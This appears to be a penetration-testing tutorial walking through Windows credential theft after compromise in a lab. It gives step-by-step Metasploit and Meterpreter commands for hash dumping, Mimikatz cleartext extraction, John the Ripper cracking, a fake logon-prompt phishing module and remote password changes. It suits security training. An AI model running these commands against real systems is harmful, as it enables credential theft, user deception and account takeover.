<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Post Exploitation for Remote Windows Password</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/post-exploitation-remote-windows-password/" rel="bookmark"><time class="entry-date published" datetime="2017-12-17T14:54:37+00:00">December 17, 2017</time><time class="updated" datetime="2025-05-27T12:03:25+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, you will learn how to extract Windows users password and change the extracted password using the Metasploit framework. </span></p>
<p><span style="color: #000000;">Here you need to exploit target machine once to obtain meterpreter session and then bypass UAC for admin privilege.</span></p>
<p><span style="color: #000000;"><strong>Requirement: </strong></span></p>
<p><span style="color: #000000;">Attacker: Kali Linux</span></p>
<p><span style="color: #000000;">Target: Windows 7</span></p>
<p><span style="color: #000000;"><strong>Let’s Begin</strong></span></p>
<h3><span style="color: #800000;"><strong>Extracting User Account Password </strong></span></h3>
<p><span style="color: #000000;"><strong>1<sup>st</sup> method </strong></span></p>
<p><span style="color: #000000;">So when your get meterpreter session of target system then follows given below steps:  </span></p>
<p><span style="color: #000000;">Execute given below command which will dump the Hash value of all saved password of all windows users as shown in given below image.</span></p>
<pre class="lang:default decode:true">meterpreter&gt; hashdump</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Lr7RrKkjuPw/WjZ-rFRgC_I/AAAAAAAASqc/Gj-wa6guvT4z7AxiCVuZki3-pcOoPiL-QCEwYBhgL/s1600/0.png"/></span></p>
<p><span style="color: #000000;">Now copy all hash value in a text file as shown below and save it. I had saved it as hash.txt on the desktop. It contains a hash value of 4 users with SID value as 500: Administrator; 501: Guest; 1001: Pentest; 1000: Raj with their hash password.</span></p>
<p><span style="color: #000000;">Run your capture session in the background:</span></p>
<pre class="lang:default decode:true ">meterpreter &gt; background</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fx5_zzsn0Rk/WjZ-rX2W2JI/AAAAAAAASqc/cj6k61j9zf4ITxvXuxZk9BRDf1PhH5w0gCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now a new terminal and use john the ripper to crack the hash by executing given below command:</span></p>
<pre class="lang:default decode:true">john --wordlist=/root/Desktop/pass.txt --format=NT /root/Desktop/hashes.txt</pre>
<p><span style="color: #000000;"><strong>/root/Desktop/pass.txt contain the path of your password dictionary</strong></span></p>
<p><span style="color: #000000;"><strong>/root/Desktop/hashes.txt contain the path of the hash password value</strong></span></p>
<p><span style="color: #000000;">From given below image you can confirm we had successfully retrieved the <strong>password: 123</strong> for user: raj by cracking its hash value.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JSZbU_TrY6k/WjZ-rSe2wkI/AAAAAAAASqY/osL2vo1Kiwgv4CxG3MPbkzfX3ZOasxyqACEwYBhgL/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>2<sup>nd</sup> Method </strong></span></h3>
<p><span style="color: #000000;">This module will dump the local user accounts from the SAM database using the registry.</span></p>
<pre class="lang:default decode:true">msf &gt; use post/windows/gather/hashdump
msf post(hashdump) &gt; set session 2
msf post(hashdump) &gt; exploit</pre>
<p><span style="color: #000000;">From given below image you can observe again we obtained a hash value for a local user account, repeat above step to crack these value using john the ripper.</span></p>
<p><span style="color: #000000;">If you will notice the highlighted text then you will observe that it has to capture password hint for user <strong>RAJ: “first three digits”</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-qmUzKn4s0R8/WjZ-r0hzDbI/AAAAAAAASqc/a4dHrHyvMFQTuf-Xf13Ex628me5x7SRnQCEwYBhgL/s1600/3.png"/></span></p>
<h3><span style="color: #800000;"><strong>3rd Method </strong></span></h3>
<p><span style="color: #000000;">This will dump local accounts from the SAM Database. If the target host is a Domain Controller, it will dump the Domain Account Database using the proper technique depending on privilege level, OS and role of the host.</span></p>
<pre class="lang:default decode:true">msf &gt; use post/windows/gather/smart_hashdump
msf post(smart_hashdump) &gt; set session 2
msf post(smart_hashdump) &gt; exploit</pre>
<p><span style="color: #000000;">From given below image you can observe again we obtained a hash value for RAJ and Administrator account, repeat above step to crack these value using john the ripper. Moreover, it has to capture the same password hint for User Raj.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Y0P-8O1WqFU/WjZ-rwhd38I/AAAAAAAASqY/CtDMk9e-s2cZlDMbF9Ku53-HtIcC_Uw2gCEwYBhgL/s1600/4.png"/></span></p>
<h3><span style="color: #800000;"><strong>4<sup>th</sup> Method </strong></span></h3>
<p><span style="color: #000000;">This module harvests credentials found on the host and stores them in the database.</span></p>
<pre class="lang:default decode:true">msf &gt; use post/windows/gather/credentials/credential_collector
msf post(credential_collector) &gt; set session 2
msf post(credential_collector) &gt; exploit</pre>
<p><span style="color: #000000;">This exploit also work in the same manner and dump the hash value for the local user account as shown in given below image, repeat above step to crack these value using john the ripper.</span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://3.bp.blogspot.com/-aeRRsbKKhFs/WjZ-sFmRh4I/AAAAAAAASqY/NA97IUcecAcbtzmTnWXcGbVxwx-Vpi1egCEwYBhgL/s1600/5.png"/></strong></span></p>
<h3><span style="color: #800000;"><strong>5<sup>th</sup> Method </strong></span></h3>
<p><span style="color: #000000;">This module will collect clear text Single Sign-On credentials from the Local Security Authority using the Mimikatz extension. Blank passwords will not be stored in the database.</span></p>
<pre class="lang:default decode:true ">msf &gt; use post/windows/gather/credentials/sso   
msf post(sso) &gt; set session 2
msf post(sso) &gt; exploit</pre>
<p><span style="color: #000000;">This exploit will dump clear text password of login user as shown in given below image <strong>user: raj</strong> and <strong>password: 123</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-wneCF9UL6ZI/WjZ-s-A3ejI/AAAAAAAASqk/3f6_NBwVeiI-7x6fTuBQ5LN8xMr2FxA9ACEwYBhgL/s1600/6.png"/></span></p>
<h3><span style="color: #800000;"><strong>6<sup>th</sup> Method </strong></span></h3>
<p><span style="color: #000000;">At the meterpreter session, we can enable option “kiwi” which will load mimikatz extensions</span></p>
<pre class="lang:default decode:true">meterprerter &gt; load kiwi</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-KwSKryD6ix4/WjZ-tS3MrCI/AAAAAAAASqk/DEHc6RsKCiQF-O-GjtEggxWhD4m4xoZlQCEwYBhgL/s1600/7.1.png"/></span></p>
<p><span style="color: #000000;">Now run following command which will extract all saved credential of the local user account as shown in given below image, here also we had successfully  retrieve  password: 123 of user: raj</span></p>
<pre class="lang:default decode:true">meterpreter &gt; creds_all</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-tSCjDpQQRJc/WjZ-te-PuXI/AAAAAAAASqY/hIWI2-uOzbA2M4hMWjIW0HY3DMsL8LtRgCEwYBhgL/s1600/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>7<sup>th</sup> Method </strong></span></h3>
<p><span style="color: #000000;">This module is able to perform a phishing attack on the target by popping up a login prompt. When the user fills credentials in the login prompt, the credentials will be sent to the attacker. The module is able to monitor for new processes and pop up a login prompt when a specific process is starting.</span></p>
<pre class="lang:default decode:true">msf &gt; use post/windows/gather/phish_windows_credentials
msf post(phish_windows_credentials) &gt; set session 2
msf post(phish_windows_credentials) &gt; exploit</pre>
<p><span style="color: #000000;">As defined above it will launch fake login prompt which will appear genuine to the victim on his logon screen and wait for the user to his credential.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wThYbnoVzZk/WjZ-tlkLMII/AAAAAAAASqc/jfCs5Jxq_64pK7e1l0kccYtaRIUqF0KpgCEwYBhgL/s1600/8.1.png"/></span></p>
<p><span style="color: #000000;">At logon screen user will get a fake pop for his credential as his will enter his username and password for login into his system, the attacker at background will sniff the entered credential.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CIosggdrt5A/WjZ-ud7TBhI/AAAAAAAASqc/FANDww1VvHwx_hYTCgqDx4eycsmzkUc6gCEwYBhgL/s1600/8.2.png"/></span></p>
<p><span style="color: #000000;">From given below image you can observe the sniff credential for user raj. It saved username, domain, and password in a table.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-iDRohDBDS78/WjZ-u14uMOI/AAAAAAAASqk/hA-sP8Vbals7rR2Q38ButC7TugPLX9UuwCEwYBhgL/s1600/8.3.png"/></span></p>
<h3><span style="color: #800000;"><strong>Change password of Remote system</strong></span></h3>
<h3><span style="color: #800000;"><strong>1<sup>st</sup> Method</strong></span></h3>
<p><span style="color: #000000;">This module will attempt to change the password of the targeted account. The typical usage is to change a newly created account’s password on a remote host to avoid the error, ‘System error 1907 has occurred,’ which is caused when the account policy enforces a password change before the next login.</span></p>
<pre class="lang:default decode:true">msf &gt; use post/windows/manage/change_password
msf post(change_password) &gt; set smbuser raj
msf post(change_password) &gt; set old_password 123
msf post(change_password) &gt; set new_password 987
msf post(change_password) &gt; set session 1
msf post(change_password) &gt; exploit</pre>
<p><span style="color: #000000;">Since after knowing logging user “raj” password you can easily change his password by exploiting above command. From given below image you can observe we had change password 123 into 987.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ofoGjg0Lens/WjZ-vVX6J_I/AAAAAAAASqk/SQApiM7VBl8BljKWF9vsnB1H-HPDYO_PgCEwYBhgL/s1600/8.png"/></span></p>
<h3><span style="color: #800000;"><strong>2<sup>nd</sup> Method</strong></span></h3>
<p><span style="color: #000000;">As we known meterpreter itself is a set of various options for post exploits it allows an attacker to open command prompt of victims system without his permission by executing shell command as given below.</span></p>
<pre class="lang:default decode:true ">meterepreter&gt; shell
net user
net user raj 123</pre>
<p><span style="color: #000000;">Hence in the 1<sup>st</sup> method, we had change password into 987 from 123 and now again in the 2<sup>nd</sup> method we had change password from 987 to 123 using simple CMD net user command as shown in given below command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-65g9j1cNdp4/WjZ-v3cMudI/AAAAAAAASqY/Ji7nrtALLhwUeQl2J-4J0wfJJWF31M9rQCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <strong>here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
